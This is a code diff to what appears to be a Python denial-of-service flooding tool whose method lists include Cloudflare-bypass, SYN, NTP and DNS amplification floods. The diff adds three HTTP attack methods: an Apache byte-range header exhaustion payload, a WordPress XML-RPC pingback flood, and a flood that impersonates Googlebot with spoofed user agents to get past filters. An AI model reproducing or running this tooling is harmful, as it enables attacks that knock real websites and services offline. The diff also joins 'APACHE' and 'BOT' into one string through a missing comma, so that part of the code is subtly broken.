@@ -38,11 +38,20 @@ __version__ = "2.0 SNAPSHOT"
 class Methods:
     LAYER7_METHODS: Set[str] = {"CFB", "BYPASS", "GET", "POST", "OVH", "STRESS",
                                 "DYN", "SLOW", "HEAD", "NULL", "COOKIE", "PPS",
-                                "EVEN", "GSB", "DGB", "AVB", "CFBUAM"}
+                                "EVEN", "GSB", "DGB", "AVB", "CFBUAM", "APACHE",
+                                "XMLRPC", "BOT"}
 
     LAYER4_METHODS: Set[str] = {"TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MEM",
                                 "NTP", "DNS", "ARD", "CHAR", "RDP"}
     ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}
+
+
+google_agents = ["Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+                 "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
+                 "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
+                 "+http://www.google.com/bot.html)) "
+                 "Googlebot/2.1 (+http://www.google.com/bot.html)",
+                 "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"]
 
 
 class Tools:
@@ -311,8 +320,9 @@ class HttpFlood:
     @staticmethod
     def getMethodType(method: str) -> str:
         return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "COOKIE", "OVH", "EVEN",
-                                            "STRESS", "DYN", "SLOW", "PPS"} \
-            else "POST" if {method.upper()} & {"POST"} \
+                                            "STRESS", "DYN", "SLOW", "PPS", "APACHE"
+                                                                            "BOT"} \
+            else "POST" if {method.upper()} & {"POST", "XMLRPC"} \
             else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
             else "REQUESTS"
 
@@ -331,7 +341,7 @@ class HttpFlood:
 
     def STRESS(self) -> None:
         payload: bytes = self.generate_payload((f"Cookie: %s=%s" % (ProxyTools.Random.rand_str(12),
-                                                                   ProxyTools.Random.rand_str(316))))
+                                                                    ProxyTools.Random.rand_str(316))))
         try:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
@@ -353,6 +363,33 @@ class HttpFlood:
         except Exception:
             s.close()
 
+    def APACHE(self) -> None:
+        payload: bytes = self.generate_payload("Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024)))
+        try:
+            with self.open_connection() as s:
+                for _ in range(self._rpc):
+                    s.send(payload)
+        except Exception:
+            s.close()
+
+    def XMLRPC(self) -> None:
+        payload: bytes = self.generate_payload(("Content-Length: 345\r\n"
+                                                "X-Requested-With: XMLHttpRequest\r\n"
+                                                "Content-Type: application/xml\r\n\r\n"
+                                                "<?xml version='1.0' encoding='iso-8859-1'?>"
+                                                "<methodCall><methodName>pingback.ping</methodName>"
+                                                "<params><param><value><string>%s</string></value>"
+                                                "</param><param><value><string>%s</string>"
+                                                "</value></param></params></methodCall>"
+                                                ) % (ProxyTools.Random.rand_str(64),
+                                                     ProxyTools.Random.rand_str(64)))[:-2]
+        try:
+            with self.open_connection() as s:
+                for _ in range(self._rpc):
+                    s.send(payload)
+        except Exception:
+            s.close()
+
     def PPS(self) -> None:
         try:
             with self.open_connection() as s:
@@ -365,6 +402,34 @@ class HttpFlood:
         payload: bytes = self.generate_payload()
         try:
             with self.open_connection() as s:
+                for _ in range(self._rpc):
+                    s.send(payload)
+        except Exception:
+            s.close()
+
+    def BOT(self) -> None:
+        payload: bytes = self.generate_payload()
+        try:
+            with self.open_connection() as s:
+                s.send(str.encode(
+                    "GET /robots.txt HTTP/1.1\r\n"
+                    "Host: %s\r\n" % self._target.raw_authority +
+                    "Connection: Keep-Alive\r\n"
+                    "Accept: text/plain,text/html,*/*\r\n"
+                    "User-Agent: %s\r\n" % randchoice(google_agents) +
+                    "Accept-Encoding: gzip,deflate,br\r\n\r\n"
+                ))
+                s.send(str.encode(
+                    "GET /sitemap.xml HTTP/1.1\r\n"
+                    "Host: %s\r\n" % self._target.raw_authority +
+                    "Connection: Keep-Alive\r\n"
+                    "Accept: */*\r\n"
+                    "From: googlebot(at)googlebot.com\r\n"
+                    "User-Agent: %s\r\n" % randchoice(google_agents) +
+                    "Accept-Encoding: gzip,deflate,br\r\n"
+                    "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9), ProxyTools.Random.rand_str(4)) +
+                    "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n"
+                ))
                 for _ in range(self._rpc):
                     s.send(payload)
         except Exception:
@@ -507,6 +572,9 @@ class HttpFlood:
         if name == "POST": self.SENT_FLOOD = self.POST
         if name == "CFB": self.SENT_FLOOD = self.CFB
         if name == "CFBUAM": self.SENT_FLOOD = self.CFBUAM
+        if name == "XMLRPC": self.SENT_FLOOD = self.XMLRPC
+        if name == "BOT": self.SENT_FLOOD = self.BOT
+        if name == "APACHE": self.SENT_FLOOD = self.APACHE
         if name == "BYPASS": self.SENT_FLOOD = self.BYPASS
         if name == "OVH": self.SENT_FLOOD = self.OVH
         if name == "AVB": self.SENT_FLOOD = self.AVB
